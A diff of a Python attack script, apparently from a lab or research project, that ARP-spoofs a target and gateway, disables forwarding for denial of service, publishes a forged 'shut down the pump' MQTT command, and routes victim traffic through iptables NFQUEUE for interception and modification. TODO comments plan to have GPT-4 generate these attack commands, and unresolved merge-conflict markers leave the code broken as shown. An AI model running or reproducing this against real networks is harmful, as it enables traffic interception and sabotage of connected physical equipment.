@@ -14,7 +14,7 @@ from netfilterqueue import NetfilterQueue
 API_KEY = "Insert here"
 openai.api_key = API_KEY
 llm_model = "gpt-4"
-targetIP = "192.168.1.17"
+targetIP = "192.168.1.46"
 attackerIP = "192.168.1.16"
 message = ""
 sniffed_topic = ""
@@ -134,8 +134,12 @@ def denial_of_service():
         #TODO: Have AI generate this command
         os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
         #Reroutes packets from the MQTT server through this computer.
+<<<<<<< HEAD
         #TODO: Have AI generate this command.
         nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.17", "192.168.1.1"])
+=======
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, "192.168.1.1"])
+>>>>>>> 9bd17df (Optimized Code)
         while True:
             #TODO: Have AI generate this command.
             os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "Shut down the pump (hacked)"')
@@ -272,9 +276,15 @@ def fake_data_transfer_attack():
         #TODO: Have AI generate this command. But you must have this program run in parrallel.
         nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, "192.168.1.1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         time.sleep(3)
+<<<<<<< HEAD
         #Enables reroutes packets from 192.168.1.17 into a nfqueue object for filtering and potential data manipulation.
         #TODO: Have AI generate this command.
         os.system("sudo iptables -A FORWARD -s 192.168.1.17 -j NFQUEUE --queue-num 1") #IPTABLES COMMAND
+=======
+        #Enables nfqueue
+        command = f"sudo iptables -A FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
+        os.system(command)
+>>>>>>> 9bd17df (Optimized Code)
         nfqueue = NetfilterQueue()
         nfqueue.bind(1, intercept_modify_forward)
         nfqueue.run()
@@ -287,8 +297,13 @@ def fake_data_transfer_attack():
         print("Stopping sniffing")
         os.kill(nodeAttack.pid, signal.SIGTERM)
         os.kill(routerAttack.pid, signal.SIGTERM)
+<<<<<<< HEAD
         #TODO: AI needs to generate a command that deletes whatever is generated on line 277 (or where is says IPTABLES COMMAND)
         os.system("sudo iptables -D FORWARD -s 192.168.1.17 -j NFQUEUE --queue-num 1")
+=======
+        command = f"sudo iptables -D FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
+        os.system(command)
+>>>>>>> 9bd17df (Optimized Code)
         # Clean up when the user interrupts the script
         nfqueue.unbind()
 
